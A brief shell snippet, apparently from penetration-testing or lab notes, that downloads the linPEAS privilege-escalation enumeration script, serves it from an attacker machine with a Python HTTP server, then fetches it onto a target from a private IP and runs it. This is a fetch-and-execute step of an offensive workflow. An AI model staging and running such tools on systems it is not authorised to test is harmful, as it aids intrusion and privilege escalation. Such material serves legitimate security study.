
```shell
wget https://github.com/peass-ng/PEASS-ng/releases/download/20241101-6f46e855/linpeas.sh

python3 -m http.server 80
wget http://192.168.45.189/linpeas.sh
chmod +x ./linpeas.sh
./linpeas.sh
```